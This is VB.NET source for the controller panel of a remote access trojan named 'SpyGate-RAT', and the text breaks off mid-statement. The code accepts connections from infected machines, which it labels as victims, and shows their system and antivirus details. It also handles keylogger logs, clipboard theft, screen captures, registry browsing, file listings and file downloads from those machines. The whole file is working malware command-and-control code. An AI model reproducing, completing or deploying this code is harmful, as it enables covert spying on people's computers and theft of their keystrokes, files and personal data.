Imports System.IO
Imports System.Text
Imports System.Threading
Imports System.Security.Cryptography
Imports System.IO.Compression
'####################################################################################
'### Coded By Umbrella-Win7 - OsamaCoder#############################################
'### في ذمتك إلين يوم القيامة إذا لم تذكر حقوقي فلن أسامحك إلين يوم القيامة #
'####################################################################################
Public Class Form1
    Private lvwColumnSorter As ListViewColumnSorter
    Public WithEvents S As SocketServer
    Public Yy As String = "|U|"
    Public Sz As Size
    Public useru As String
    Public pw As String = "Win7"
    Public pinger As Integer = 0
    Public tictoc As Integer = 0
    Public folder As String
    Public folder1 As String
    Dim appPath As String
    Dim Message As String
    Public sock As Integer
    Function QZ(ByVal q As Integer) As Size '  Lower Size of image
        Dim zs As New Size(Sz)
        Select Case q
            Case 0
                Return Sz
            Case 1
                zs.Width = zs.Width / 1.1
                zs.Height = zs.Height / 1.1
            Case 2
                zs.Width = zs.Width / 1.3
                zs.Height = zs.Height / 1.3
            Case 3
                zs.Width = zs.Width / 1.5
                zs.Height = zs.Height / 1.5
            Case 4
                zs.Width = zs.Width / 1.9
                zs.Height = zs.Height / 1.9
            Case 5
                zs.Width = zs.Width / 2
                zs.Height = zs.Height / 2
            Case 6
                zs.Width = zs.Width / 2.1
                zs.Height = zs.Height / 2.1
            Case 7
                zs.Width = zs.Width / 2.2
                zs.Height = zs.Height / 2.2
            Case 8
                zs.Width = zs.Width / 2.5
                zs.Height = zs.Height / 2.5
            Case 9
                zs.Width = zs.Width / 3
                zs.Height = zs.Height / 3
            Case 10
                zs.Width = zs.Width / 3.5
                zs.Height = zs.Height / 3.5
            Case 11
                zs.Width = zs.Width / 4
                zs.Height = zs.Height / 4
            Case 12
                zs.Width = zs.Width / 5
                zs.Height = zs.Height / 5
            Case 13
                zs.Width = zs.Width / 6
                zs.Height = zs.Height / 6
        End Select
        zs.Width = Mid(zs.Width.ToString, 1, zs.Width.ToString.Length - 1) & 0
        zs.Height = Mid(zs.Height.ToString, 1, zs.Height.ToString.Length - 1) & 0
        Return zs
    End Function
    Private Sub Form1_FormClosing(ByVal sender As Object, ByVal e As System.Windows.Forms.FormClosingEventArgs) Handles Me.FormClosing
        End
    End Sub

    Private Sub Form1_Load(sender As Object, e As EventArgs) Handles MyBase.Load
        Control.CheckForIllegalCrossThreadCalls = False


        Timer1.Start()
        NotifyIcon1.Icon = Me.Icon
        S = New SocketServer
        Try
            Dim aa As String() = Split(File.ReadAllText(Application.StartupPath & "\Settings.ini"), "|")
            If aa(0) = "true" Then


                S.Start(aa(1))
                ToolStripStatusLabel3.Text = "Listening On Port : " & aa(1)
            End If

        Catch : End Try
    End Sub

    Private Sub L1_ColumnClick(ByVal sender As Object, ByVal e As System.Windows.Forms.ColumnClickEventArgs)
        ' Determine if the clicked column is already the column that is 
        ' being sorted.
        Try


            If (e.Column = lvwColumnSorter.SortColumn) Then
                ' Reverse the current sort direction for this column.
                If (lvwColumnSorter.Order = SortOrder.Ascending) Then
                    lvwColumnSorter.Order = SortOrder.Descending
                Else
                    lvwColumnSorter.Order = SortOrder.Ascending
                End If
            Else
                ' Set the column number that is to be sorted; default to ascending.
                lvwColumnSorter.SortColumn = e.Column
                lvwColumnSorter.Order = SortOrder.Ascending
            End If

            ' Perform the sort with these new sort options.
            Me.L1.Sort()
        Catch ex As Exception

        End Try
    End Sub
    Private Sub Form1_Resize(ByVal sender As Object, ByVal e As System.EventArgs) Handles Me.Resize
        If WindowState = FormWindowState.Minimized Then
            ShowIcon = False
            ShowInTaskbar = False
            Me.Hide()
            NotifyIcon1.BalloonTipIcon = ToolTipIcon.Info
            NotifyIcon1.BalloonTipTitle = "SpyGate-RAT v 0.2.6"
            NotifyIcon1.BalloonTipText = "Server online [x]".Replace("x", L1.Items.Count)
            NotifyIcon1.ShowBalloonTip(1000)
        Else

        End If
    End Sub
    Private Sub SdfghToolStripMenuItem_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles SdfghToolStripMenuItem.Click
        ShowIcon = True
        ShowInTaskbar = True
        Me.Show()
    End Sub

#Region "Server Events"
    Sub Disconnect(ByVal sock As Integer) Handles S.DisConnected
        Try
            L1.Items(sock.ToString).Remove()
        Catch ex As Exception
        End Try


    End Sub
    Sub Connected(ByVal sock As Integer) Handles S.Connected

        S.Send(sock, "info" & Yy & pw) ' i ask him to send me PC name


    End Sub
    Delegate Sub _Datad(ByVal info As Data)
    Sub data(ByVal info As Data) Handles S.Datad
        Dim a As String = info.GetData
        Dim aa As String() = a.Split("|")
        Select Case aa(0)
            Case "tt"
                MsgBox("Umbrella-Win7-Error")
        End Select

    End Sub
    Delegate Sub _Data(ByVal sock As Integer, ByVal B As Byte())
    Sub Data(ByVal sock As Integer, ByVal B As Byte()) Handles S.Data
        Dim T As String = BS(B)
        Dim A As String() = Split(T, Yy)
        Try
            Select Case A(0)
                Case "info" ' Client Sent me PC name

                    Dim f As backconnection = My.Application.OpenForms("new" & sock)
                    If f Is Nothing Then
                        If Me.InvokeRequired Then
                            Me.Invoke(New _Data(AddressOf data), New Object() {sock, B})
                            Exit Sub
                        End If

                        f = New backconnection
                        f.Name = "new" & sock
                        f.Label1.Text = S.IP(sock)
                        f.Label2.Text = A(1)
                        f.Label3.Text = A(2)
                        f.Label4.Text = A(3)
                        f.Label5.Text = A(4)
                        f.Show()

                        Dim L = L1.Items.Add(sock.ToString, A(1), GetCountryNumber(UCase(A(3))))
                        L.SubItems.Add(S.IP(sock))
                        L.SubItems.Add(A(2))
                        L.SubItems.Add(A(3))
                        L.SubItems.Add(A(4))
                        L.SubItems.Add(A(5))
                        L.SubItems.Add(" ")
                        L.SubItems.Add(A(6))
                        L.SubItems.Add(A(7))
                        L.SubItems.Add(A(8))
                        L.SubItems.Add(A(9))
                        L.SubItems.Add(A(10))
                        L.ToolTipText = sock
                        
                    End If
                    If My.Computer.FileSystem.DirectoryExists(Application.StartupPath & "/SpyGate-RAT/" & A(1) & "/Download") Then
                    Else
                        My.Computer.FileSystem.CreateDirectory(Application.StartupPath & "/SpyGate-RAT/" & A(1) & "/Download")
                    End If
                    If My.Computer.FileSystem.DirectoryExists(Application.StartupPath & "/SpyGate-RAT/" & A(1) & "/Screen Capture") Then
                    Else
                        My.Computer.FileSystem.CreateDirectory(Application.StartupPath & "/SpyGate-RAT/" & A(1) & "/Screen Capture")
                    End If

                    folder = (Application.StartupPath & "/SpyGate-RAT/" & (A(1)) & "/Download\")
                    folder1 = (Application.StartupPath & "/SpyGate-RAT/" & (A(1)) & "/Screen Capture\")

                    NotifyIcon1.BalloonTipIcon = ToolTipIcon.Info
                    NotifyIcon1.BalloonTipTitle = "SpyGate-RAT v 0.2.6"
                    NotifyIcon1.BalloonTipText = "New Server [ ID : " & A(1) & " IP : " & S.IP(sock) & " Country : " & A(3) & " ]"
                    NotifyIcon1.ShowBalloonTip(1)
                Case "infoDesk"
                    If CheckBox1.Checked = True Then
                        Dim m As New IO.MemoryStream(Convert.FromBase64String(A(1)))
                        SyncLock Me.PictureBox1
                            Me.PictureBox1.Image = Image.FromStream(m)
                        End SyncLock
                    End If
                    ListView1.Items.Clear()
                    ListView1.Items.Add(A(2), 0)
                    ListView1.Items.Add(S.IP(sock), 1)
                    ListView1.Items.Add(A(3), 2)
                    ListView1.Items.Add(A(4), 3)
                    ListView1.Items.Add(pinger & " ms", 4)
                    ListView1.Items.Add(A(5), 5)
                    ListView1.Items.Add(A(6), 6)
                    pinger = 0
                    Timer2.Enabled = False
                Case "sendinformation"
                    Timer2.Stop()
                    If My.Application.OpenForms("Information" & sock) IsNot Nothing Then Exit Sub
                    If Me.InvokeRequired Then
                        Dim j As New _Data(AddressOf data)
                        Me.Invoke(j, New Object() {sock, B})
                        Exit Sub
                    End If
                    Dim info As New Information
                    info.sock = sock
                    info.Name = "Information" & sock
                    info.Text = info.Text & " " & S.IP(sock)
                    info.rtinfo1.Text = "Username : " & A(2) & vbNewLine & "Victime Name : " & A(30) & vbNewLine & "Country : " & A(5) & vbNewLine & "Language : " & A(19) & vbNewLine & "Antivirus : " & A(6) & vbNewLine & "Webcam : " & A(9) & vbNewLine & "Active Window : " & A(10) & vbNewLine & "Local Time : " & A(11) & vbNewLine & "Computer Open : " & A(12) & vbNewLine & "Current Directory : " & A(13) & vbNewLine & "Command Line : " & A(20) & "System Directory : " & A(14) & vbNewLine & "User Domain Name : " & A(15) & vbNewLine & "User Interactive : " & A(16) & vbNewLine & "Working Set : " & A(17)
                    info.rtinfo2.Text = "Computer Name : " & A(1) & vbNewLine & "Operating System : " & A(3) & vbNewLine & "Operating System Platform : " & A(4) & vbNewLine & "Operating System version : " & A(18) & vbNewLine & "RAM : " & A(7) & vbNewLine & "Processor Name : " & A(23) & vbNewLine & "Identifier : " & A(24) & vbNewLine & "System Product : " & A(25) & vbNewLine & "BIOS Release Date : " & A(26) & vbNewLine & "BIOS Version : " & A(27) & vbNewLine & "System Manufacturer : " & A(28) & vbNewLine & "BIOS Vendor : " & A(29)
                    info.Show()
                    pinger = 0
                Case "AW"
                    For i As Integer = 0 To L1.Items.Count - 1
                        If L1.Items.Item(i).SubItems(1).Text = S.IP(sock) Then
                            L1.Items.Item(i).SubItems(6).Text = A(1)
                            Exit For
                        End If
                    Next
                Case "F"
                    For i As Integer = 0 To L1.Items.Count - 1
                        If L1.Items.Item(i).SubItems(1).Text = S.IP(sock) Then
                            L1.Items.Item(i).ForeColor = Color.Black
                            Exit For
                        End If
                    Next
                Case "fun"
                    If My.Application.OpenForms("fun" & sock) IsNot Nothing Then Exit Sub
                    If Me.InvokeRequired Then
                        Dim j As New _Data(AddressOf data)
                        Me.Invoke(j, New Object() {sock, B})
                        Exit Sub
                    End If
                    Dim fm As New fun
                    fm.sock = sock
                    fm.Name = "fun" & sock
                    fm.Text = fm.Text & S.IP(sock)
                    fm.f = Me
                    fm.Show()
                Case "chat"
                    Dim f As Chatt = My.Application.OpenForms("chat" & sock)
                    If f Is Nothing Then
                        If Me.InvokeRequired Then
                            Me.Invoke(New _Data(AddressOf data), New Object() {sock, B})
                            Exit Sub
                        End If
                        f = New Chatt
                        f.sock = sock
                        f.Name = "chat" & sock
                        f.Text += "Chatting" & " - " & S.IP(sock)
                        f.Show()
                    End If

                Case "recv"
                    If L1.FindItemWithText(S.IP(sock)) Is Nothing Then
                        S.Disconnect(sock)
                    End If
                    Dim f As Chatt = My.Application.OpenForms("chat" & sock)
                    f.Recv.ScrollToCaret()
                    f.Recv.Text += Environment.NewLine & "Victim : " & A(1)
                    f.Recv.SelectionStart = f.Recv.Text.Length
                    f.Recv.ScrollToCaret()
                Case "downloadedfile"
                    IO.File.WriteAllBytes(folder & A(2), Convert.FromBase64String(A(1)))
                    Threading.Thread.CurrentThread.Sleep(1000)
                Case "openkl"
                    If My.Application.OpenForms("openkl" & sock) IsNot Nothing Then Exit Sub
                    If Me.InvokeRequired Then
                        Dim j As New _Data(AddressOf data)
                        Me.Invoke(j, New Object() {sock, B})
                        Exit Sub
                    End If
                    Dim fm As New keylogger
                    fm.sock = sock
                    fm.Name = ("openkl" & sock)
                    fm.Text = fm.Text & S.IP(sock)
                    fm.Show()
                Case "loges"
                    Dim F As keylogger = My.Application.OpenForms("openkl" & sock)
                    Dim T1 As New Thread(AddressOf F.Getloges)
                    T1.Start(A(1))
                Case "viewimage"
                    Dim fff As Form5 = My.Application.OpenForms("|||" & sock)
                    If A(1) = "Error" Then
                        fff.Back1ToolStripMenuItem.PerformClick()
                    Else
                        Dim picbyte() As Byte = Convert.FromBase64String(A(1))
                        Dim ms As New MemoryStream(picbyte)
                        fff.pic1.Image = Image.FromStream(ms)
                    End If
                Case "openRG"
                    Dim reg As Reg = My.Application.OpenForms("Reg" & sock)
                    If Me.InvokeRequired Then
                        Dim j As New _Data(AddressOf data)
                        Me.Invoke(j, New Object() {sock, B})
                        Exit Sub
                    End If
                    Dim regi As New Reg
                    regi.Name = "Reg" & sock
                    regi.sock = sock
                    regi.Text = "Registry" & " - " & S.IP(sock)
                    regi.Show()
                Case "RG"
                    Dim reg As Reg = My.Application.OpenForms("Reg" & sock)
                    If Me.InvokeRequired Then
                        Dim j As New _Data(AddressOf data)
                        Me.Invoke(j, New Object() {sock, B})
                        Exit Sub
                    End If
                    Select Case A(1)
                        Case "~"
                            reg.RGk.Enabled = True
                            reg.RGLIST.Enabled = True
                            reg.RGk.SelectedNode.Nodes.Clear()
                            reg.RGLIST.Items.Clear()
                            reg.pr.Value = 0
                            reg.pr.Maximum = (A.Length - 3)
                            Dim num20 As Integer = (A.Length - 1)
                            Dim i As Integer = 3
                            Do While (i <= num20)
                                Try
                                    reg.pr = reg.pr
                                    reg.pr.Value += 1
                                    If (A(i).Length > 0) Then
                                        If A(i).Contains("/") Then
                                            Dim strArray2 As String() = Strings.Split(A(i), "/", -1, CompareMethod.Binary)
                                            Dim item As ListViewItem = reg.RGLIST.Items.Add(strArray2(0))
                                            item.SubItems.Add(strArray2(1))
                                            Try
                                                item.SubItems.Add(strArray2(2))
                                            Catch exception17 As Exception

                                                Dim exception3 As Exception = exception17

                                            End Try
                                            If (strArray2(1) = "String") Then
                                                item.ImageIndex = 1
                                            Else
                                                item.ImageIndex = 2
                                            End If
                                        Else
                                            reg.RGk.SelectedNode.Nodes.Add(A(i))
                                        End If
                                    End If
                                Catch exception18 As Exception

                                    Dim exception4 As Exception = exception18

                                End Try
                                i += 1
                            Loop
                            reg.RGk.SelectedNode.Expand()
                            reg.RGk.Select()
                            reg.RGk.Focus()
                            Dim num21 As Integer = (reg.RGLIST.Columns.Count - 1)
                            Dim j As Integer = 0
                            Do While (j <= num21)
                                reg.RGLIST.Columns.Item(j).AutoResize(ColumnHeaderAutoResizeStyle.HeaderSize)
                                j += 1
                            Loop
                            reg.pr.Value = 0

                            Exit Select

                    End Select
                Case "F"
                    For i As Integer = 0 To L1.Items.Count - 1
                        If L1.Items.Item(i).SubItems(1).Text = S.IP(sock) Then
                            L1.Items.Item(i).ForeColor = Color.Black
                            Exit For
                        End If
                    Next
                Case "clipss"
                    Dim f As Form7 = My.Application.OpenForms("clipss" & sock)
                    If f Is Nothing Then
                        If Me.InvokeRequired Then
                            Me.Invoke(New _Data(AddressOf data), New Object() {sock, B})
                            Exit Sub
                        End If
                        f = New Form7
                        f.sock = sock
                        f.Name = "clipss" & sock
                        f.Text = "Get ClipBoard" & " - " & S.IP(sock)
                        f.Show()
                    End If
                Case "recvcli"
                    Dim f As Form7 = My.Application.OpenForms("clipss" & sock)
                    f.TextBox1.Text = A(1)
                Case "|||"
                    If My.Application.OpenForms("|||" & sock) IsNot Nothing Then Exit Sub
                    If Me.InvokeRequired Then
                        Dim j As New _Data(AddressOf data)
                        Me.Invoke(j, New Object() {sock, B})
                        Exit Sub
                    End If
                    Dim fm As New Form5
                    fm.sock = sock
                    fm.Name = "|||" & sock
                    fm.Text = fm.Text & S.IP(sock)
                    fm.Show()
                Case "|||"    ' open file manager
                    If My.Application.OpenForms("|||" & sock) IsNot Nothing Then Exit Sub
                    If Me.InvokeRequired Then
                        Dim j As New _Data(AddressOf data)
                        Me.Invoke(j, New Object() {sock, B})
                        Exit Sub
                    End If
                    Dim fm As New Form5
                    fm.sock = sock
                    fm.Name = "|||" & sock
                    fm.Text = fm.Text & " " & S.IP(sock)
                    fm.Show()
                Case "FileManager"
                    Dim fff As Form5 = My.Application.OpenForms("|||" & sock)
                    If A(1) = "Error" Then
                        fff.BackToolStripMenuItem1.PerformClick()
                    Else
                        fff.ListView1.Items.Clear()
                        Dim allFiles As String() = Split(A(1), "FileManagerSplit")
                        For i = 0 To allFiles.Length - 2
                            Dim itm As New ListViewItem
                            itm.Text = allFiles(i)
                            itm.SubItems.Add(allFiles(i + 1))
                            If Not itm.Text.StartsWith("[Drive]") And Not itm.Text.StartsWith("[CD]") And Not itm.Text.StartsWith("[Folder]") Then
                                Dim fsize As Long = Convert.ToInt64(itm.SubItems(1).Text)
                                If fsize > 1073741824 Then
                                    Dim size As Double = fsize / 1073741824
                                    itm.SubItems(1).Text = Math.Round(size, 2).ToString & " GB"
                                ElseIf fsize > 1048576 Then
                                    Dim size As Double = fsize / 1048576
                                    itm.SubItems(1).Text = Math.Round(size, 2).ToString & " MB"
                                ElseIf fsize > 1024 Then
                                    Dim size As Double = fsize / 1024
                                    itm.SubItems(1).Text = Math.Round(size, 2).ToString & " KB"
                                Else
                                    itm.SubItems(1).Text = fsize.ToString & " B"
                                End If
                                itm.Tag = Convert.ToInt64(allFiles(i + 1))
                            End If
                            If itm.Text.StartsWith("[Drive]") Then
                                itm.ImageIndex = 0
                                itm.Text = itm.Text.Substring(7)
                            ElseIf itm.Text.StartsWith("[CD]") Then
                                itm.ImageIndex = 1
                                itm.Text = itm.Text.Substring(4)
                            ElseIf itm.Text.StartsWith("[Folder]") Then
                                itm.ImageIndex = 2
                                itm.Text = itm.Text.Substring(8)
                            ElseIf itm.Text.EndsWith(".exe") Or itm.Text.EndsWith(".EXE") Or itm.Text.EndsWith(".scr") Or itm.Text.EndsWith(".SCR") Then
                                itm.ImageIndex = 3
                            ElseIf itm.Text.EndsWith(".jpg") Or itm.Text.EndsWith(".JPG") Or itm.Text.EndsWith(".jpeg") Or itm.Text.EndsWith(".JPEG") Or itm.Text.EndsWith(".ico") Or itm.Text.EndsWith(".ICO") Or itm.Text.EndsWith(".svg") Or itm.Text.EndsWith(".SVG") Or itm.Text.EndsWith(".svgz") Or itm.Text.EndsWith(".SVGZ") Or itm.Text.EndsWith(".drw") Or itm.Text.EndsWith(".DRW") Or itm.Text.EndsWith(".psp") Or itm.Text.EndsWith(".PSP") Or itm.Text.EndsWith(".gif") Or itm.Text.EndsWith(".GIF") Or itm.Text.EndsWith(".png") Or itm.Text.EndsWith(".PNG") Or itm.Text.EndsWith(".bmp") Or itm.Text.EndsWith(".BMP") Or itm.Text.EndsWith(".dib") Or itm.Text.EndsWith(".DIB") Or itm.Text.EndsWith(".jpe") Or itm.Text.EndsWith(".JPE") Or itm.Text.EndsWith(".jfif") Or itm.Text.EndsWith(".JFIF") Or itm.Text.EndsWith(".tif") Or itm.Text.EndsWith(".TIF") Or itm.Text.EndsWith(".tiff") Or itm.Text.EndsWith(".TIFF") Then
                                itm.ImageIndex = 4
                            ElseIf itm.Text.EndsWith(".txt") Or itm.Text.EndsWith(".TXT") Or itm.Text.EndsWith(".log") Or itm.Text.EndsWith(".LOG") Or itm.Text.EndsWith(".readme") Or itm.Text.EndsWith(".README") Or itm.Text.EndsWith(".me") Or itm.Text.EndsWith(".ME") Then
                                itm.ImageIndex = 5
                            ElseIf itm.Text.EndsWith(".dll") Or itm.Text.EndsWith(".DLL") Or itm.Text.EndsWith(".db") Or itm.Text.EndsWith(".DB") Then
                                itm.ImageIndex = 6
                            ElseIf itm.Text.EndsWith(".zip") Or itm.Text.EndsWith(".ZIP") Or itm.Text.EndsWith(".rar") Or itm.Text.EndsWith(".RAR") Or itm.Text.EndsWith(".7z") Or itm.Text.EndsWith(".7Z") Or itm.Text.EndsWith(".jar") Or itm.Text.EndsWith(".JAR") Or itm.Text.EndsWith(".tar") Or itm.Text.EndsWith(".TAR") Or itm.Text.EndsWith(".tgz") Or itm.Text.EndsWith(".TGZ") Or itm.Text.EndsWith(".gz") Or itm.Text.EndsWith(".GZ") Or itm.Text.EndsWith(".bz2") Or itm.Text.EndsWith(".BZ2") Or itm.Text.EndsWith(".tbz2") Or itm.Text.EndsWith(".TBZ2") Or itm.Text.EndsWith(".gzip") Or itm.Text.EndsWith(".GZIP") Or itm.Text.EndsWith(".z") Or itm.Text.EndsWith(".Z") Or itm.Text.EndsWith(".sit") Or itm.Text.EndsWith(".SIT") Or itm.Text.EndsWith(".cab") Or itm.Text.EndsWith(".CAB") Or itm.Text.EndsWith(".lzh") Or itm.Text.EndsWith(".LZH") Or itm.Text.EndsWith(".pkg") Or itm.Text.EndsWith(".PKG") Then
                                itm.ImageIndex = 7
                            ElseIf itm.Text.EndsWith(".bat") Or itm.Text.EndsWith(".BAT") Or itm.Text.EndsWith(".cmd") Or itm.Text.EndsWith(".CMD") Then
                                itm.ImageIndex = 9
                            ElseIf itm.Text.EndsWith(".avi") Or itm.Text.EndsWith(".AVI") Or itm.Text.EndsWith(".divx") Or itm.Text.EndsWith(".DIVX") Or itm.Text.EndsWith(".mkv") Or itm.Text.EndsWith(".MKV") Or itm.Text.EndsWith(".webm") Or itm.Text.EndsWith(".WEBM") Or itm.Text.EndsWith(".mp4") Or itm.Text.EndsWith(".MP4") Or itm.Text.EndsWith(".m4v") Or itm.Text.EndsWith(".M4V") Or itm.Text.EndsWith(".mp4v") Or itm.Text.EndsWith(".MP4V") Or itm.Text.EndsWith(".mpv4") Or itm.Text.EndsWith(".MPV4") Or itm.Text.EndsWith(".ogm") Or itm.Text.EndsWith(".OGM") Or itm.Text.EndsWith(".ogv") Or itm.Text.EndsWith(".OGV") Or itm.Text.EndsWith(".flv") Or itm.Text.EndsWith(".FLV") Or itm.Text.EndsWith(".mpeg") Or itm.Text.EndsWith(".MPEG") Or itm.Text.EndsWith(".mpg") Or itm.Text.EndsWith(".MPG") Or itm.Text.EndsWith(".mp2v") Or itm.Text.EndsWith(".MP2V") Or itm.Text.EndsWith(".mpv2") Or itm.Text.EndsWith(".MPV2") Or itm.Text.EndsWith(".m1v") Or itm.Text.EndsWith(".M1V") Or itm.Text.EndsWith(".m2v") Or itm.Text.EndsWith(".M2V") Or itm.Text.EndsWith(".m2p") Or itm.Text.EndsWith(".M2P") Or itm.Text.EndsWith(".mpe") Or itm.Text.EndsWith(".MPE") Or itm.Text.EndsWith(".ts") Or itm.Text.EndsWith(".TS") Or itm.Text.EndsWith(".m2ts") Or itm.Text.EndsWith(".M2TS") Or itm.Text.EndsWith(".mts") Or itm.Text.EndsWith(".MTS") Or itm.Text.EndsWith(".m2t") Or itm.Text.EndsWith(".M2T") Or itm.Text.EndsWith(".tps") Or itm.Text.EndsWith(".TPS") Or itm.Text.EndsWith(".hdmov") Or itm.Text.EndsWith(".HDMOV") Or itm.Text.EndsWith(".mov") Or itm.Text.EndsWith(".MOV") Or itm.Text.EndsWith(".3gp") Or itm.Text.EndsWith(".3GP") Or itm.Text.EndsWith(".3gpp") Or itm.Text.EndsWith(".3GPP") Or itm.Text.EndsWith(".wmv") Or itm.Text.EndsWith(".WMV") Or itm.Text.EndsWith(".asf") Or itm.Text.EndsWith(".ASF") Or itm.Text.EndsWith(".ifo") Or itm.Text.EndsWith(".IFO") Or itm.Text.EndsWith(".vob") Or itm.Text.EndsWith(".VOB") Or itm.Text.EndsWith(".mpls") Or itm.Text.EndsWith(".MPLS") Or itm.Text.EndsWith(".rm") Or itm.Text.EndsWith(".RM") Or itm.Text.EndsWith(".rmvb") Or itm.Text.EndsWith(".RMVB") Then
                                itm.ImageIndex = 11
                            ElseIf itm.Text.EndsWith(".mp3") Or itm.Text.EndsWith(".MP3") Or itm.Text.EndsWith(".it") Or itm.Text.EndsWith(".IT") Or itm.Text.EndsWith(".asx") Or itm.Text.EndsWith(".ASX") Or itm.Text.EndsWith(".au") Or itm.Text.EndsWith(".AU") Or itm.Text.EndsWith(".mid") Or itm.Text.EndsWith(".MID") Or itm.Text.EndsWith(".midi") Or itm.Text.EndsWith(".MIDI") Or itm.Text.EndsWith(".snd") Or itm.Text.EndsWith(".SND") Or itm.Text.EndsWith(".wma") Or itm.Text.EndsWith(".WMA") Or itm.Text.EndsWith(".aiff") Or itm.Text.EndsWith(".AIFF") Or itm.Text.EndsWith(".ogg") Or itm.Text.EndsWith(".OGG") Or itm.Text.EndsWith(".oga") Or itm.Text.EndsWith(".OGA") Or itm.Text.EndsWith(".mka") Or itm.Text.EndsWith(".MKA") Or itm.Text.EndsWith(".m4a") Or itm.Text.EndsWith(".M4A") Or itm.Text.EndsWith(".aac") Or itm.Text.EndsWith(".AAC") Or itm.Text.EndsWith(".flac") Or itm.Text.EndsWith(".FLAC") Or itm.Text.EndsWith(".wv") Or itm.Text.EndsWith(".WV") Or itm.Text.EndsWith(".mpc") Or itm.Text.EndsWith(".MPC") Or itm.Text.EndsWith(".ape") Or itm.Text.EndsWith(".APE") Or itm.Text.EndsWith(".apl") Or itm.Text.EndsWith(".APL") Or itm.Text.EndsWith(".alac") Or itm.Text.EndsWith(".ALAC") Or itm.Text.EndsWith(".tta") Or itm.Text.EndsWith(".TTA") Or itm.Text.EndsWith(".ac3") Or itm.Text.EndsWith(".AC3") Or itm.Text.EndsWith(".dts") Or itm.Text.EndsWith(".DTS") Or itm.Text.EndsWith(".amr") Or itm.Text.EndsWith(".AMR") Or itm.Text.EndsWith(".ra") Or itm.Text.EndsWith(".RA") Or itm.Text.EndsWith(".wav") Or itm.Text.EndsWith(".WAV") Or itm.Text.EndsWith(".mpcpl") Or itm.Text.EndsWith(".MPCPL") Or itm.Text.EndsWith(".m3u") Or itm.Text.EndsWith(".M3U") Or itm.Text.EndsWith(".pls") Or itm.Text.EndsWith(".PLS") Then
                                itm.ImageIndex = 10
                            ElseIf itm.Text.EndsWith(".lnk") Or itm.Text.EndsWith(".LNK") Then
                                itm.ImageIndex = 12
                            ElseIf itm.Text.EndsWith(".bin") Or itm.Text.EndsWith(".BIN") Or itm.Text.EndsWith(".bak") Or itm.Text.EndsWith(".BAK") Or itm.Text.EndsWith(".dat") Or itm.Text.EndsWith(".DAT") Then
                                itm.ImageIndex = 13
                            ElseIf itm.Text.EndsWith(".xlsx") Or itm.Text.EndsWith(".XLSX") Or itm.Text.EndsWith(".xlsm") Or itm.Text.EndsWith(".XLSM") Or itm.Text.EndsWith(".xlsb") Or itm.Text.EndsWith(".XLSB") Or itm.Text.EndsWith(".xltm") Or itm.Text.EndsWith(".XLTM") Or itm.Text.EndsWith(".xlam") Or itm.Text.EndsWith(".XLAM") Or itm.Text.EndsWith(".xltx") Or itm.Text.EndsWith(".XLTX") Or itm.Text.EndsWith(".xll") Or itm.Text.EndsWith(".XLL") Then
                                itm.ImageIndex = 14
                            ElseIf itm.Text.EndsWith(".doc") Or itm.Text.EndsWith(".DOC") Or itm.Text.EndsWith(".rtf") Or itm.Text.EndsWith(".RTF") Or itm.Text.EndsWith(".docx") Or itm.Text.EndsWith(".DOCX") Or itm.Text.EndsWith(".docm") Or itm.Text.EndsWith(".DOCM") Or itm.Text.EndsWith(".psw") Or itm.Text.EndsWith(".PSW") Or itm.Text.EndsWith(".dot") Or itm.Text.EndsWith(".DOT") Or itm.Text.EndsWith(".dotx") Or itm.Text.EndsWith(".DOTX") Or itm.Text.EndsWith(".dotm") Or itm.Text.EndsWith(".DOTM") Then
                                itm.ImageIndex = 15
                            ElseIf itm.Text.EndsWith(".ini") Or itm.Text.EndsWith(".INI") Or itm.Text.EndsWith(".sys") Or itm.Text.EndsWith(".SYS") Or itm.Text.EndsWith(".css") Or itm.Text.EndsWith(".CSS") Or itm.Text.EndsWith(".inf") Or itm.Text.EndsWith(".INF") Then
                                itm.ImageIndex = 16
                            ElseIf itm.Text.EndsWith(".pdf") Or itm.Text.EndsWith(".PDF") Then
                                itm.ImageIndex = 17
                            ElseIf itm.Text.EndsWith(".pptx") Or itm.Text.EndsWith(".PPTX") Or itm.Text.EndsWith(".ppt") Or itm.Text.EndsWith(".PPT") Or itm.Text.EndsWith(".pps") Or itm.Text.EndsWith(".PPS") Or itm.Text.EndsWith(".pptm") Or itm.Text.EndsWith(".PPTM") Or itm.Text.EndsWith(".potx") Or itm.Text.EndsWith(".POTX") Or itm.Text.EndsWith(".potm") Or itm.Text.EndsWith(".POTM") Or itm.Text.EndsWith(".ppam") Or itm.Text.EndsWith(".PPAM") Or itm.Text.EndsWith(".ppsx") Or itm.Text.EndsWith(".PPSX") Or itm.Text.EndsWith(".ppsm") Or itm.Text.EndsWith(".PPSM") Then
                                itm.ImageIndex = 18
                            ElseIf itm.Text.EndsWith(".swf") Or itm.Text.EndsWith(".SWF") Or itm.Text.EndsWith(".htm") Or itm.Text.EndsWith(".HTM") Or itm.Text.EndsWith(".html") Or itm.Text.EndsWith(".HTML") Then
                                itm.ImageIndex = 20
                            ElseIf itm.Text.EndsWith(".reg") Or itm.Text.EndsWith(".REG") Then
                                itm.ImageIndex = 19
                            ElseIf itm.Text.EndsWith(".AACCDB") Or itm.Text.EndsWith(".aaccdb") Or itm.Text.EndsWith(".ACCDE") Or itm.Text.EndsWith(".accde") Or itm.Text.EndsWith(".ACCDT") Or itm.Text.EndsWith(".accdt") Or itm.Text.EndsWith(".ACCDR") Or itm.Text.EndsWith(".accdr") Then
                                itm.ImageIndex = 21
                            ElseIf itm.Text.EndsWith(".xml") Or itm.Text.EndsWith(".XML") Then
                                itm.ImageIndex = 22
                            ElseIf itm.Text.EndsWith(".odt") Or itm.Text.EndsWith(".ODT") Or itm.Text.EndsWith(".ott") Or itm.Text.EndsWith(".OTT") Or itm.Text.EndsWith(".sxw") Or itm.Text.EndsWith(".SXW") Or itm.Text.EndsWith(".stw") Or itm.Text.EndsWith(".STW") Or itm.Text.EndsWith(".sor") Or itm.Text.EndsWith(".SOR") Or itm.Text.EndsWith(".sxc") Or itm.Text.EndsWith(".SXC") Or itm.Text.EndsWith(".stc") Or itm.Text.EndsWith(".STC") Or itm.Text.EndsWith(".sxi") Or itm.Text.EndsWith(".SXI") Or itm.Text.EndsWith(".sti") Or itm.Text.EndsWith(".STI") Or itm.Text.EndsWith(".sxd") Or itm.Text.EndsWith(".SXD") Or itm.Text.EndsWith(".std") Or itm.Text.EndsWith(".STD") Or itm.Text.EndsWith(".sxg") Or itm.Text.EndsWith(".SXG") Then
                                itm.ImageIndex = 23
                            ElseIf itm.Text.EndsWith(".temp") Or itm.Text.EndsWith(".TEMP") Or itm.Text.EndsWith(".tmp") Or itm.Text.EndsWith(".TMP") Then
